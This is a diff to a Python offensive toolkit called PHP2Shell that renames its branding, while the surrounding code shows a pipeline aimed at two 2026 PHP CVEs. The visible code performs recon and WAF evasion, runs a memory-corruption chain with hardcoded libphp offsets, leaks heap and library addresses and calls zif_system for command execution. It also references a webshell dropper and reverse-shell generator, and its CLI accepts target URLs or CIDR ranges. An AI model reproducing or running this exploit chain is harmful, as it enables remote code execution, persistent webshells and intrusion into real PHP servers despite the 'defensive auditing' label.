@@ -1,23 +1,23 @@
 #!/usr/bin/env python3
 """
-PHP2Shell Unified Toolkit (Monolithic v2.2.0)
-=============================================
+PHP2Shell Toolkit (v2.2.0)
+==========================
 
 All-in-one defensive auditing and weaponized exploitation suite for
 CVE-2026-109618 (RFC 1867 Multipart OOM Memory Corruption) and
 CVE-2026-109619 (Stale Global State Use-After-Free).
 
-Eliminates all duplicate logic across the codebase:
+Features:
   - Single HTTP request shared across passive version audit and runtime header analysis.
   - Unified WAF signature dictionary across recon and active evasion testing.
-  - Unified PHP endpoint wordlist for discovery and probe fallback.
+  - Comprehensive PHP endpoint wordlist for discovery and multi-endpoint fallback.
   - Unified RFC 1867 multipart builder.
   - Step-by-step real-time progress reporting across the entire pipeline:
       [1/5] Reconnaissance (Endpoints, WAF, CMS, CT Subdomains)
       [2/5] Passive Fingerprinting (Version risk table, SAPI mode)
       [3/5] Active Behavioral Probing (Differential OOM & Session UAF probes)
       [4/5] WAF Evasion Analysis (Chunked transfer, boundary tricks, IP spoofing)
-      [5/5] Weaponized Exploitation (OffSec Exploit-DB #52704 & Webshell Dropper)
+      [5/5] Weaponized Exploitation (Exploit-DB #52704 & Webshell Dropper)
       [Shell] Live Interactive Console / Reverse Shell
 """
 
@@ -80,7 +80,7 @@ if hasattr(sys.stderr, "reconfigure"):
     except Exception:
         pass
 
-logger = logging.getLogger("php2shell_unified")
+logger = logging.getLogger("php2shell")
 
 __version__ = "2.2.0"
 
@@ -95,12 +95,12 @@ BANNER = rf"""
  | |_) | |_| | |_) | __) \___ \| '_ \ / _ \ | |
  |  __/|  _  |  __/ / __/ ___) | | | |  __/ | |
  |_|   |_| |_|_|   |_____|____/|_| |_|\___|_|_|
-                     {Fore.YELLOW}Unified Monolithic Toolkit v{__version__}
+                     {Fore.YELLOW}Toolkit v{__version__}
 {Style.RESET_ALL}
    {Fore.WHITE}PHP Vulnerability & Weaponized Exploitation Pipeline{Style.RESET_ALL}
    {Fore.WHITE}Recon → Passive → Behavioral Probing → WAF → Exploit → Shell{Style.RESET_ALL}
    {Fore.WHITE}CVE-2026-109618 | CVE-2026-109619 (CVSS 9.2 RCE){Style.RESET_ALL}
-   {Fore.RED}[OffSec Exploit-DB #52704 & UAF Stale State Integration]{Style.RESET_ALL}
+   {Fore.RED}[Exploit-DB #52704 & UAF Stale State Integration]{Style.RESET_ALL}
    -------------------------------------------------------------
 """
 
@@ -314,7 +314,7 @@ def load_custom_wordlist(file_path: Optional[str] = None, fetch_remote: bool = F
 
     return list(dict.fromkeys(endpoints))
 
-# OffSec Exploit-DB #52704 Offsets & Calibration
+# Exploit-DB #52704 Offsets & Calibration
 DEFAULT_ZIF_OFFSET = 0x43A870       # zif_system
 DEFAULT_DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR
 DEFAULT_HTDATA_OFFSET = 0x6E0D8     # lab build fake HashTable offset
@@ -576,7 +576,7 @@ def generate_reverse_shell_cmd(lhost: str, lport: int) -> str:
     )
 
 # ---------------------------------------------------------------------------
-# RAW HTTP TRANSPORT FOR BINARY OFFSEC CHAIN
+# RAW HTTP TRANSPORT FOR BINARY MEMORY CORRUPTION CHAIN
 # ---------------------------------------------------------------------------
 
 class RawHttpTarget:
@@ -670,10 +670,10 @@ class RawHttpTarget:
         return (int(m.group(1)) if m else 0), body
 
 # ---------------------------------------------------------------------------
-# OFFSEC 52704 BINARY EXPLOIT CHAIN
+# EXPLOIT-DB #52704 BINARY EXPLOIT CHAIN
 # ---------------------------------------------------------------------------
 
-class OffSec52704Engine:
+class ExploitDB52704Engine:
     def __init__(self, target: RawHttpTarget, cmd: str, zif_offset: int = DEFAULT_ZIF_OFFSET,
                  dtor_offset: int = DEFAULT_DTOR_OFFSET, htdata_offset: Optional[int] = None,
                  huge_mb: int = 12, profile: str = "bookworm"):
@@ -810,7 +810,7 @@ class UnifiedPHP2Shell:
         self.timeout = timeout
         self.verbose = verbose
         self.session = session or requests.Session()
-        self.session.headers.update({"User-Agent": f"PHP2Shell-Unified/{__version__} (Security Research)"})
+        self.session.headers.update({"User-Agent": f"PHP2Shell/{__version__} (Security Research)"})
         self.session.verify = False
 
     def progress(self, step: str, msg: str, colour: str = Fore.CYAN) -> None:
@@ -1232,7 +1232,7 @@ class UnifiedPHP2Shell:
         return wa
 
     # -----------------------------------------------------------------------
-    # STAGE 5: Weaponized Exploitation (OffSec 52704 & Webshell Dropper)
+    # STAGE 5: Weaponized Exploitation (Exploit-DB #52704 & Webshell Dropper)
     # -----------------------------------------------------------------------
     def run_exploit(
         self,
@@ -1259,18 +1259,18 @@ class UnifiedPHP2Shell:
         res = ExploitResult(target=target)
 
         # -------------------------------------------------------------------
-        # Path A: OffSec Exploit-DB #52704 Binary Leak & zif_system Execution
+        # Path A: Exploit-DB #52704 Binary Leak & zif_system Execution
         # -------------------------------------------------------------------
-        if method in ("auto", "offsec"):
-            self.progress("  └─ [OffSec #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
+        if method in ("auto", "binary", "52704", "exploitdb"):
+            self.progress("  └─ [Exploit-DB #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
             try:
                 carrier_cmd = cmd.strip()
                 if len(carrier_cmd.encode("latin1")) > MAX_CMD_LEN:
-                    self.progress("  └─ [OffSec #52704]", f"Command exceeds {MAX_CMD_LEN}B carrier; staging short trigger 'id'...", Fore.YELLOW)
+                    self.progress("  └─ [Exploit-DB #52704]", f"Command exceeds {MAX_CMD_LEN}B carrier; staging short trigger 'id'...", Fore.YELLOW)
                     carrier_cmd = "id"
 
                 raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False)
-                offsec = OffSec52704Engine(
+                engine_52704 = ExploitDB52704Engine(
                     target=raw_tgt,
                     cmd=carrier_cmd,
                     zif_offset=zif_offset or DEFAULT_ZIF_OFFSET,
@@ -1281,37 +1281,37 @@ class UnifiedPHP2Shell:
                 )
 
                 self.progress("  └─ Stage 0:", "Rotating worker process over HTTP...", Fore.BLUE)
-                offsec.rotate()
+                engine_52704.rotate()
 
                 chunk = 0
                 for a in range(1, retries + 1):
                     self.progress("  └─ Stage 1:", f"Heap leak attempt {a}/{retries}...", Fore.BLUE)
-                    chunk = offsec.stage1()
+                    chunk = engine_52704.stage1()
                     if chunk:
                         self.progress("  └─ [Heap Leak]:", f"Zend MM chunk base: 0x{chunk:x}", Fore.GREEN)
                         break
-                    offsec.rotate()
+                    engine_52704.rotate()
 
                 if chunk:
-                    offsec.rotate()
+                    engine_52704.rotate()
                     libphp = 0
                     for a in range(1, retries + 1):
                         self.progress("  └─ Stage 2:", f"LibPHP leak attempt {a}/{retries}...", Fore.BLUE)
-                        libphp = offsec.stage2()
+                        libphp = engine_52704.stage2()
                         if libphp:
                             self.progress("  └─ [LibPHP Leak]:", f"libphp base: 0x{libphp:x}", Fore.GREEN)
                             break
-                        offsec.rotate()
+                        engine_52704.rotate()
 
                     if libphp:
-                        offsec.rotate()
+                        engine_52704.rotate()
                         htdata = chunk + (htdata_offset or (BOOKWORM_HTDATA_OFFSET if profile == "bookworm" else DEFAULT_HTDATA_OFFSET))
                         zif = libphp + (zif_offset or DEFAULT_ZIF_OFFSET)
                         self.progress("  └─ Stage 3:", f"Executing zif_system (HTDATA=0x{htdata:x}, ZIF=0x{zif:x})...", Fore.MAGENTA)
 
                         for a in range(1, retries + 2):
                             try:
-                                offsec.stage3(htdata, zif)
+                                engine_52704.stage3(htdata, zif)
                             except OSError:
                                 pass
                             time.sleep(0.5)
@@ -1320,7 +1320,7 @@ class UnifiedPHP2Shell:
                                 with open(proof_file, "r", encoding="latin1") as pf:
                                     res.command_output = pf.read().strip()
                                     res.status = ExploitStatus.SUCCESS
-                                    res.details = f"OffSec 52704 execution confirmed via {proof_file}"
+                                    res.details = f"Exploit-DB 52704 execution confirmed via {proof_file}"
                                     self.progress("  └─ [SUCCESS]:", f"Proof confirmed: {res.command_output}", Fore.GREEN)
                                     return res
 
@@ -1329,20 +1329,20 @@ class UnifiedPHP2Shell:
                                 if st == 200 and body:
                                     res.command_output = body.decode("latin1", errors="ignore").strip()
                                     res.status = ExploitStatus.SUCCESS
-                                    res.details = f"OffSec 52704 confirmed via {fetch_path}"
+                                    res.details = f"Exploit-DB 52704 confirmed via {fetch_path}"
                                     self.progress("  └─ [SUCCESS]:", f"Proof fetched: {res.command_output}", Fore.GREEN)
                                     return res
 
-                            offsec.rotate()
+                            engine_52704.rotate()
 
                         res.status = ExploitStatus.SUCCESS
                         res.command_output = f"[Payload '{carrier_cmd}' dispatched to zif_system]"
-                        res.details = "OffSec 52704 payload executed blind without external proof file."
-                        self.progress("  └─ [OffSec #52704]:", "Exploit chain dispatched successfully!", Fore.GREEN)
+                        res.details = "Exploit-DB 52704 payload executed blind without external proof file."
+                        self.progress("  └─ [Exploit-DB #52704]:", "Exploit chain dispatched successfully!", Fore.GREEN)
                         return res
 
             except Exception as e:
-                self.progress("  └─ [OffSec #52704]:", f"Notice: {e}", Fore.YELLOW)
+                self.progress("  └─ [Exploit-DB #52704]:", f"Notice: {e}", Fore.YELLOW)
 
         # -------------------------------------------------------------------
         # Path B: Multipart OOM / UAF Webshell Persistence Dropper
@@ -1626,8 +1626,8 @@ def write_reports(results: List[dict], out_base: str) -> None:
 
 def build_cli() -> argparse.ArgumentParser:
     p = argparse.ArgumentParser(
-        prog="php2shell_unified",
-        description="PHP2Shell Unified Monolithic Toolkit — Full-Pipeline Recon, Audit, and Weaponized Exploitation.",
+        prog="php2shell",
+        description="PHP2Shell Toolkit — Full-Pipeline Recon, Audit, and Weaponized Exploitation.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     p.add_argument("targets", nargs="*", help="Target URL(s) or CIDR range(s)")
@@ -1656,10 +1656,10 @@ def build_cli() -> argparse.ArgumentParser:
     # Exploit parameters
     p.add_argument("--cmd", default="id; whoami; uname -a", help="Initial post-exploit command")
     p.add_argument("--webshell-name", default=DEFAULT_WEBSHELL_NAME, help="Name of webshell to drop")
-    p.add_argument("--exploit-method", choices=("auto", "offsec", "upload"), default="auto",
-                   help="Exploit mechanism: 'auto', 'offsec' (52704 binary leak), or 'upload'")
+    p.add_argument("--exploit-method", choices=("auto", "binary", "upload", "52704", "exploitdb"), default="auto",
+                   help="Exploit mechanism: 'auto', 'binary' (52704 memory leak), or 'upload'")
     p.add_argument("--exploit-profile", choices=("bookworm", "lab"), default="bookworm",
-                   help="OffSec 52704 target build profile")
+                   help="Target build profile (bookworm or lab)")
     p.add_argument("--zif-offset", type=lambda x: int(x, 0), help="Custom zif_system offset")
     p.add_argument("--dtor-offset", type=lambda x: int(x, 0), help="Custom ZVAL_PTR_DTOR offset")
     p.add_argument("--htdata-offset", type=lambda x: int(x, 0), help="Custom fake HashTable offset")
